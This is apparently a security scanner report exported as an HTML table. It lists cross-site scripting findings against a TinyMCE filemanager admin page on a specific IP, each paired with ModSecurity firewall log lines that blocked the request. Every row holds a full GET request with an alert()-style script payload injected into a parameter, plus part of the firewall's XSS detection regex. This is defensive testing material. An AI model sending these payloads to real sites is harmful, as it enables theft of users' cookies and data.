This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f89d6ce</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(763899)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f89d6ce=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=6np7pk5mfc4nrgs5iha9jjmlf1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:11</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:10 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(763899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttSqwQAW0AAD9hYOcAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttSqwQAW0AAD9hYOcAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366957</td><td class=xl24 width=64 >2015-03-31 23:52:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(483299)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=tkl6v5rie3cf1hdbu71rcgo0j1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:13</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:11 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(483299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttS6wQAW0AABt@bWYAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttS6wQAW0AABt@bWYAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366958</td><td class=xl24 width=64 >2015-03-31 23:53:56</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(136899)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=38ea4pb6o4vegn9aukrrglngg3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:14</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:13 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(136899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttTawQAW0AAHchlV4AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttTawQAW0AAHchlV4AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366959</td><td class=xl24 width=64 >2015-03-31 23:56:06</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(912399)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=etpaalg5s437tv0ktboerb8ib0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:15</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:14 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(912399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttTqwQAW0AAHgzv1AAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttTqwQAW0AAHgzv1AAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366960</td><td class=xl24 width=64 >2015-03-31 23:57:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(630899)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=96sqsj5uq731ked6m9jlc28sl3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:16</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:15 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(630899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttT6wQAW0AAB7zKN0AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttT6wQAW0AAB7zKN0AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366961</td><td class=xl24 width=64 >2015-03-31 23:59:31</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(802799)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=k5ha1ion1li8dvb633evkn2h63
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:18</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:16 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(802799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttUKwQAW0AAHhGMuYAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttUKwQAW0AAHhGMuYAAAAK</td>